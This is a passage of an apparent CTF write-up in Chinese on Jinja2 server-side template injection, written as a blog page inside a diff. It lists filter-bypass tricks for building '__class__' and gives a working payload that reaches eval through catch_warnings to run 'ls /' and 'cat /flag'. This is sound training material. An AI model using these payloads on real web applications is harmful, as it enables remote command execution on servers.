+</code></pre>
+</li>
+</ol>
+<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><ol>
+<li><p>attr</p>
+<p> attr用于获取变量</p>
+<pre><code>&quot;&quot;|attr(&quot;__class__&quot;)
+相当于
+&quot;&quot;.__class__
+</code></pre>
+<p> 这个大家应该见的比较多了，常见于点号(.)被过滤，或者点号(.)和中括号([])都被过滤的情况</p>
+</li>
+<li><p>format</p>
+<pre><code>&#123; &quot;%s, %s!&quot;|format(greeting, name) &#125;&#125; 
+</code></pre>
+<p> 那么我们想要调用__class__就可以用format了</p>
+<pre><code>&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#39;__class__&#39;
+&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]
+</code></pre>
+</li>
+<li><p>first last random</p>
+<pre><code>Return the first item of a sequence.
+Return the last item of a sequence.
+Return a random item from the sequence.
+</code></pre>
+<p> random的话是随机返回，这样我们跑个脚本肯定是可以得到我们想要的</p>
+<pre><code>&quot;&quot;.__class__.__mro__|last()
+相当于
+&quot;&quot;.__class__.__mro__[-1]
+</code></pre>
+</li>
+<li><p>join</p>
+<p> 多了一种字符串拼接的方法</p>
+<pre><code>&quot;&quot;[[&#39;__clas&#39;,&#39;s__&#39;]|join] 或者 &quot;&quot;[(&#39;__clas&#39;,&#39;s__&#39;)|join]
+相当于
+&quot;&quot;[&quot;__class__&quot;]
+</code></pre>
+</li>
+<li><p>lower</p>
+<pre><code>&quot;&quot;[&quot;__CLASS__&quot;|lower]
+</code></pre>
+</li>
+<li><p>replace reverse</p>
+<p> 我们可以利用替换和反转还原回我们要用的字符串了</p>
+<pre><code>&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;
+&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;
+</code></pre>
+</li>
+<li><p>string</p>
+<p> 功能类似于python内置函数 str有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。</p>
+<pre><code>().__class__   出来的是&lt;class &#39;tuple&#39;&gt;
+(().__class__|string)[0] 出来的是&lt;
+</code></pre>
+</li>
+<li><p>select unique</p>
+<p> 我们和上面的结合就会发现他们巨大的用处</p>
+<pre><code>()|select|string
+结果如下
+&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;
+
+这样我们会拥有比前面更多的字符来用于拼接
+(()|select|string)[24]~
+(()|select|string)[24]~
+(()|select|string)[15]~
+(()|select|string)[20]~
+(()|select|string)[6]~
+(()|select|string)[18]~
+(()|select|string)[18]~
+(()|select|string)[24]~
+(()|select|string)[24]
+
+得到字符串&quot;__class__&quot;
+</code></pre>
+</li>
+<li><p>list</p>
+<p> 转换成列表更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>  只是单纯的字符串的话取单个字符方法有限</p>
+<pre><code>(()|select|string)[0]
+如果中括号被过滤了，挺难的
+但是列表的话就可以用pop取下标了
+当然都可以使用__getitem__
+
+(()|select|string|list).pop(0)
+</code></pre>
+</li>
+</ol>
+<h3 id="获取键值或下标"><a href="#获取键值或下标" class="headerlink" title="获取键值或下标"></a>获取键值或下标</h3><pre><code>dict[&#39;__builtins__&#39;]
+dict.__getitem__(&#39;__builtins__&#39;)
+dict.pop(&#39;__builtins__&#39;)
+dict.get(&#39;__builtins__&#39;)
+dict.setdefault(&#39;__builtins__&#39;)
+list[0]
+list.__getitem__(0)
+list.pop(0)
+</code></pre>
+<h3 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h3><pre><code>().__class__
+()[&quot;__class__&quot;]
+()|attr(&quot;__class__&quot;)
+().__getattribute__(&quot;__class__&quot;)
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311649320.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220331164902207"></p>
+
+<p>存在模板注入,上面语句之间拿来试试</p>
+<pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;   
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         
+    &#123;% if 'eval' in b.keys() %&#125;    
+      &#123;&#123; b['eval']('__import__("os").popen("ls /").read()') &#125;&#125; 
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311650851.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220331165002752"></p>
+
+<p>过滤了啥</p>
+<pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;   
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         
+    &#123;% if 'eval' in b.keys() %&#125;    
+      &#123;&#123; b['eval']('__import__("os").popen("cat /flag").read()') &#125;&#125; 
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311650151.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220331165047039"></p>
+
+<p>骗我</p>
+
+	</div>
+
+	
+
+	
+
+	
+		<div class="post-tags">
+			<i class="fa fa-tags" aria-hidden="true"></i>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/ctf-show/" rel="tag">ctf.show</a>
+		</div>
+	
+</article>
+
+	<div id="share_container">
+	<div id="share" data-initialized="true">
+		<a class="no-pjax icon-wechat" tooltip="分享到微信">
+			<button class="btn btn-icon btn-success">
+				<span class="btn-inner--icon"><i class="fa fa-weixin"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-douban" tooltip="分享到豆瓣">
+			<button class="btn btn-icon btn-primary" style="background: #209261;border: none;">
+				豆
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-qq" tooltip="分享到 QQ">
+			<button class="btn btn-icon btn-primary" style="background: #2196f3;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-qq"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-qzone" tooltip="分享到 QQ 空间">
+			<button class="btn btn-icon btn-primary" style="background: #ffc107;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-star"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-weibo" tooltip="分享到微博">
+			<button class="btn btn-icon btn-warning">
+				<span class="btn-inner--icon"><i class="fa fa-weibo"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-facebook" tooltip="分享到 Facebook">
+			<button class="btn btn-icon btn-primary" style="background: #283593;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-facebook"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-twitter" tooltip="分享到 Twitter">
+			<button class="btn btn-icon btn-primary" style="background: #03a9f4;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=https://lovewanan.github.io/ctfshow/ctf.show/SSTI/&text=SSTI" tooltip="分享到 Telegram">
+			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-copy-link" id="share_copy_link" tooltip="复制链接">
+			<button class="btn btn-icon btn-default">
+				<span class="btn-inner--icon"><i class="fa fa-link"></i></span>
+			</button>
+		</a>
+	</div>
+	<button id="share_show" class="btn btn-icon btn-primary" tooltip="分享">
+		<span class="btn-inner--icon"><i class="fa fa-share"></i></span>
+	</button>
+</div>
+<script type="text/javascript">
+	socialShare("#share", {
+	    title : 'SSTI',
+	    description : 'web361SSTI原理SSTi学习
+SSTI沙盒逃逸
+网址输入“{undefined{7+7}}”...',
+	    wechatQrcodeTitle : "分享到微信",
+	    wechatQrcodeHelper : '微信扫描二维码',
+	    source : 'https://lovewanan.github.io/ctfshow/ctf.show/SSTI/'
+	});
+	$("#share_show")[0].onclick = function(){
+		$("#share_container").addClass("opened");
+	};
+	$("#share_copy_link")[0].onclick = function(){
+		let input = document.createElement('input');
+		document.body.appendChild(input);
+		input.setAttribute("value", window.location.href);
+		input.setAttribute("readonly", "readonly");
+		input.setAttribute("style", "opacity: 0;mouse-events:none;");
+		input.select();
+		if (document.execCommand('copy')){
+			iziToast.show({
+				title: '链接已复制',
+				message: "链接已复制到剪贴板",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#2dce89',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-check',
+				timeout: 5000
+			});
+		}else{
+			iziToast.show({
+				title: '复制失败',
+				message: "请手动复制链接",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#f5365c',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-close',
+				timeout: 5000
+			});
+		}
+		document.body.removeChild(input);
+	};
+</script>
+
+
+
+
+	<div id="post_comment" class="card shadow-sm">
+		<div id="waline"></div>
+<script>
+  Waline({
+	el: '#waline',
+	serverURL: 'https://waline-jaua9chtw-lovewanan.vercel.app',
+  });
+</script>
+
+	</div>
+
+
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/ctfshow/ctf.show/XSS/" rel="prev"> XSS</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/ctfshow/ctf.show/SSRF/" rel="next"> SSRF</a></div></div>
+
+
+
+
+		
+		
+		
+		
+
+					<footer id="footer" class="site-footer card shadow-sm border-0">
+						
+						<div>Theme <a target="_blank" rel="noopener" href="https://github.com/solstice23/hexo-theme-argon"><strong>Argon</strong></a> | Powered by Hexo</div>
+						<span id="busuanzi_container_site_uv">
+							本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+						</span>
+					</footer>
+				</main>
+			</div>
+		</div>
+		
+<script src="/argontheme.js"></script>
+
+		
+		
+		
+
+		
+			<script>
+				var argonEnableCodeHighlight = true;
+			</script>
+			
+<link rel="stylesheet" href="/assets/vendor/highlight/styles/github-gist.css">
+
+		
+
+	</div>
+</div>
+<noscript>
+	<style>
+		article img.lazyload[src^="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPg"]{display: none;}
+		.comment-item-text .comment-sticker.lazyload{display: none;}
+	</style>
+</noscript>
+</body>
+
+
+
+</html>
+
